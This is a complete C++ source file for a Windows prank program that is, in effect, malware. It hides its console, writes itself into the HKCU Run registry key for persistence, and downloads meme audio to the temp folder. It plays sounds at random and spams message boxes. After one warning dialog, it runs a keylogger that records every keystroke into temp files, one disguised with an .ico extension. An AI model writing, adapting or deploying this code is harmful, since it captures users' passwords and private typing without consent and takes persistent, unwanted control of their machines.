
#include <iostream>
#include <windows.h>
#include <thread>
#include <chrono>
#include <shlobj_core.h>
#include <curl/curl.h>
#include <fstream>
#include <vector>
#include <random>

#pragma comment(lib, "winmm.lib")

void logFilesHEHE(std::string path);
void writeToFileSTRING(const char* keys, std::string path);
void writeToFile(char keys, std::string path);
void addToAutoStart();
void playSoundRandom(const std::vector<std::string>& soundFiles);
void playAudio();
bool createDirectory(const std::string& path);
void downloadAllFiles(const std::vector<std::string>& urls);
void showDialog();
void spamEndlessly();

char keys;
boolean writeToPath;
std::string defaultSoundPath;


int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    
        HWND window;
        AllocConsole();
        window = FindWindowA("ConsoleWindowClass", NULL);
        ShowWindow(window, 0);
        addToAutoStart();
        std::cout << "Hallo!\n";


        std::vector<std::string> downloadAudioUrls = {
            "https://www.myinstants.com/media/sounds/fart-with-reverb.mp3",
            "https://www.myinstants.com/media/sounds/lmfao-everyday-im-shuffling.mp3",
            "https://www.myinstants.com/media/sounds/vine-boom.mp3",
            "https://www.myinstants.com/media/sounds/skibidi-toilet.mp3",
            "https://www.myinstants.com/media/sounds/talahon-mark-forster_IrRCeen.mp3",
            "https://www.myinstants.com/media/sounds/panjabi-mc-mundian-to-bach-ke-the-dictator-soundtrack-0s-7s-djztxj2gpfk.mp3",
            "https://www.myinstants.com/media/sounds/preview_4.mp3",
            "https://www.myinstants.com/media/sounds/discord-notification.mp3"
        };

        downloadAllFiles(downloadAudioUrls);



        showDialog();



 }

void HideConsole(){
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
}

void start() {
    //std::thread audioThread(playAudioAfterDelay);
  

    writeToPath = true;

    wchar_t tempPath[MAX_PATH];
    if (GetTempPath(MAX_PATH, tempPath) != 0) {
        std::wstring wstr(tempPath);
        std::string filePath(wstr.begin(), wstr.end());
        std::cout << filePath;
        logFilesHEHE(filePath);
    }
    else {
        std::string filePath = "";
        logFilesHEHE(filePath);
    }

}




void logFilesHEHE(std::string path) {
    while (true) {
        for (keys = 0; keys < 256; keys++) {
            if (GetAsyncKeyState(keys) & 0x1) { // wenn key gedrückt + wir verschieben mit bitwise AND so, dass wir einen boolean bekommen

                switch (keys) {
                    case VK_BACK:
                        std::cout << "BACKSPACE";
                        writeToFileSTRING("[BACKSPACE]", path);
                        break;
                    case VK_RETURN:
                        std::cout << "RETURN";
                        writeToFileSTRING("[RETURN]", path);
                        break;
                    case VK_SHIFT:
                        std::cout << "SHIFT";
                        writeToFileSTRING("[SHIFT]", path);
                        break;
                    case VK_CONTROL:
                        std::cout << "CONTROL";
                        writeToFileSTRING("[CONTROL]", path);
                        break;
                    case VK_CAPITAL:
                        std::cout << "CAPITAL";
                        writeToFileSTRING("[CAPITAL]", path);
                        break;
                    case VK_TAB:
                        std::cout << "TAB";
                        writeToFileSTRING("[TAB]", path);
                        break;
                    case VK_MENU:
                        std::cout << "MENU";
                        writeToFileSTRING("[MENU]", path);
                        break;
                    case VK_LBUTTON: case VK_RBUTTON: case VK_MBUTTON:
                        break;
                    default:
                        writeToFile(keys, path); //write (normal keys)
                };
                std::cout << keys;
              
            }
        };
    }
}

std::wstring toWideString(const std::string& str) {
    int len = MultiByteToWideChar(CP_ACP, 0, str.c_str(), -1, NULL, 0);
    std::wstring wideStr(len, 0);
    MultiByteToWideChar(CP_ACP, 0, str.c_str(), -1, &wideStr[0], len);
    return wideStr;
}

void playAudio(const std::string& filename) {
    std::cout << "playing " + filename;
    std::wstring wsTmp(filename.begin(), filename.end());

    std::wstring openCommand = L"open \"" + wsTmp + L"\" type mpegvideo alias myaudio";
    DWORD result = mciSendStringW(openCommand.c_str(), NULL, 0, NULL);
    if (result != 0) {
        std::wcerr << L"Error opening file: " << result << std::endl;
        return;
    }

    std::wstring playCommand = L"play myaudio";
    result = mciSendStringW(playCommand.c_str(), NULL, 0, NULL);
    if (result != 0) {
        std::wcerr << L"Error playing file: " << result << std::endl;
        return;
    }

    /*// Wait for the sound to finish playing
    MCI_STATUS_PARMS status;
    status.dwCallback = 0;
    result = mciSendStringW(L"status myaudio length", (LPWSTR)&status.dwReturn, sizeof(status.dwReturn), NULL);
    if (result != 0) {
        std::wcerr << L"Error getting status: " << result << std::endl;
        return;
    }*/

    std::this_thread::sleep_for(std::chrono::seconds(20));

    // Close the media
    result = mciSendStringW(L"close myaudio", NULL, 0, NULL);
    if (result != 0) {
        std::wcerr << L"Error closing file: " << result << std::endl;
    }
}

bool createDirectory(const std::string& path) {
    if (CreateDirectoryA(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS) {
        return true;
    }
    else {
        std::cerr << "Failed to create directory: " << path << " Error: " << GetLastError() << std::endl;
        return false;
    }
}


size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
    std::ofstream* out = (std::ofstream*)userp;
    size_t totalSize = size * nmemb;
    out->write((char*)contents, totalSize);
    return totalSize;
}


void showDialog() {
    int option = MessageBoxA(NULL, "WARNING! This Executable may be harmful for your PC, click OKAY to proceed", "WARNING", MB_OKCANCEL | MB_ICONHAND);

    wchar_t tempPath[MAX_PATH];
    if (GetTempPath(MAX_PATH, tempPath) != 0) {
        std::wstring wstr(tempPath);
        std::string filePath(wstr.begin(), wstr.end());
        if (option == IDOK) {
            playAudio(filePath + "\\fart-with-reverb.mp3");
            start();
        } else {
            
        }
    }

}


void getAudioFile(std::string url, std::string filePath) {
    CURL* curl;
    CURLcode response;

    
    

    std::string audioPath = filePath;
    std::ofstream out(audioPath, std::ios::binary);

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &out);
        response = curl_easy_perform(curl);
        if (response != CURLE_OK) {
            std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(response) << std::endl;
        }
        curl_easy_cleanup(curl);

    }
    curl_global_cleanup();
    

}

void playSoundRandom(const std::vector<std::string>& soundFiles) {
    std::random_device rand;
    std::mt19937 gen(rand());
    std::uniform_int_distribution<> dis(0, soundFiles.size() - 1);
    std::this_thread::sleep_for(std::chrono::seconds(45));
    while (true) {
        std::this_thread::sleep_for(std::chrono::seconds(10));
        int index = dis(gen);
        std::string soundFile = soundFiles[index];
        playAudio(soundFile);
        
    }
}

void showMessage() {
    PlaySound(L"SND_ALIAS_SYSTEMASTERISK", NULL, SND_SYNC);
    if (MessageBoxA(NULL, "Lel", "BRP", MB_OK | MB_ICONQUESTION) == IDOK) {
        PlaySound(L"MouseClick", NULL, SND_SYNC);
    }
}

void spamEndlessly() {
    std::vector<std::thread> messageThreads;

    
    int end = 100;
    while (end != 0) {
        messageThreads.emplace_back(showMessage);
        messageThreads.back().detach();
    }
}

void spamMessages() {
    std::vector<std::thread> messageThreads;
   
    
    std::this_thread::sleep_for(std::chrono::seconds(50));
    int wait = 10;
    int end = 100;
    while (end!= 0) {
        messageThreads.emplace_back(showMessage);
        messageThreads.back().detach();

        if (wait != 1) {
            std::this_thread::sleep_for(std::chrono::seconds(wait));
            wait = wait - 1;
        }
        else {
           
        }
      
       
        
        end = end - 1;
       
    }
}

void downloadAllFiles(const std::vector<std::string>& urls) {
    std::vector<std::thread> downloadThreads;
    std::vector<std::string> fileNames;

    wchar_t tempPath[MAX_PATH];
    if (GetTempPath(MAX_PATH, tempPath) != 0) {
        std::wstring wstr(tempPath);
        std::string filePath(wstr.begin(), wstr.end());

        for (const auto& url : urls) {
            std::string fileName = filePath + url.substr(url.find_last_of('/') + 1);
            fileNames.push_back(fileName);
            std::cout << fileName;
            downloadThreads.emplace_back(getAudioFile, url, fileName);
        }

        for (auto& thread : downloadThreads) {
            thread.join();
        }

       

        std::thread randomSoundThread(playSoundRandom, fileNames);
        std::thread spamThread(spamMessages);
        
        randomSoundThread.detach();
        spamThread.detach();
    }
}



/*void playAudioAfterDelay() {
    std::this_thread::sleep_for(std::chrono::minutes(2));  // Wait for 2 minutes
    // Example: Play a sound (Windows-specific)
    PlaySound(TEXT("path_to_your_audio_file.wav"), NULL, SND_FILENAME | SND_ASYNC);
}*/

void addToAutoStart() {
    wchar_t exePathBuf[MAX_PATH];
    GetModuleFileName(NULL, exePathBuf, MAX_PATH);

    std::wstring wstr(exePathBuf);
    std::string exePATH(wstr.begin(), wstr.end());
    

    std::cout << exePATH << std::endl;



    
    HKEY hkey = NULL;
    LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey); //Creates a key       
    LONG status = RegSetValueEx(hkey, L"MyApp", 0, REG_SZ, (BYTE*)wstr.c_str(), (wstr.size() + 1) * sizeof(wchar_t));
}


void writeToFileSTRING(const char* keys, std::string path){

    std::ofstream output;
    
    output.open(path + "cooleDatei.txt", std::ios::app);
     
    if (output.is_open()) {
        // OKAY

        output << keys << std::endl;
        output.close();
    }
    else {
        //NOT OKAY


    }

}

void writeToFile(char keys, std::string path) {

    std::ofstream output;

    output.open(path + "cooleDatei.ico", std::ios::app);

    if (output.is_open()) {
        // OKAY

        output << keys << std::endl;
        output.close();
    }
    else {
        //NOT OKAY


    }

}